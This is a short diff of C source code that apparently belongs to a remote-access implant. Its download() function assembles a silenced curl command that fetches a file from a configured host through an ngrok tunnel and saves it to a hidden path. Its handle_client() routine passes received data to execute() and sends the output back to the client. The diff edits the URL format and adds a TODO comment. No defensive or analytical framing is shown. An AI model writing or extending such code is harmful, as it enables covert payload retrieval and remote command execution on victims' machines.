@@ -152,7 +152,7 @@ int download() {
 #endif
     char command[1024];
     #define NGROK_SKIP_HEADER "--header \"ngrok-skip-browser-warning: skip-browser-warning\""
-    sprintf(command, "curl -o %s https://%s/%s %s > /dev/null 2>&1", HIDDEN_PATH, HOST, HIDDEN_FILENAME2, NGROK_SKIP_HEADER);
+    sprintf(command, "curl -o %s %s/%s %s > /dev/null 2>&1", HIDDEN_PATH, HOST, HIDDEN_FILENAME2, NGROK_SKIP_HEADER);
 #ifdef VERBOSE
     printf("%s\n", command);
 #endif
@@ -200,9 +200,9 @@ void* handle_client(void* arg) {
             close(client_fd);
             return NULL;
         }
-
         messages_sent++;
 
+        // interpter commands TODO
         char* output = execute(buffer);
 
         int bytes_sent = send(client_fd, output, strlen(output), 0);
